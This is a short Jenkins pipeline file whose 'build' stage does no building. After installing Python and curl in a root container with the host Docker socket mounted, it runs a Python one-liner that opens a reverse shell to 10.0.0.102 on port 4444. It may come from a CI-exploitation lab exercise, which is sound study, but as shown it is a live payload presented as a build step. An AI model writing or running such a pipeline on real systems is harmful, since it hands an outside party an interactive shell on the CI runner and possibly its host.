pipeline {
    agent {
      docker {
        image 'ubuntu:latest'
        args '-u root:sudo -v /var/run/docker.sock:/var/run/docker.sock'
        }
      }
    stages {
        stage('build') {
            steps {
                sh 'apt update -y'
                sh 'apt install python3.6 -y'
                sh 'apt install curl -y'
                sh 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
            }
        }
    }
}
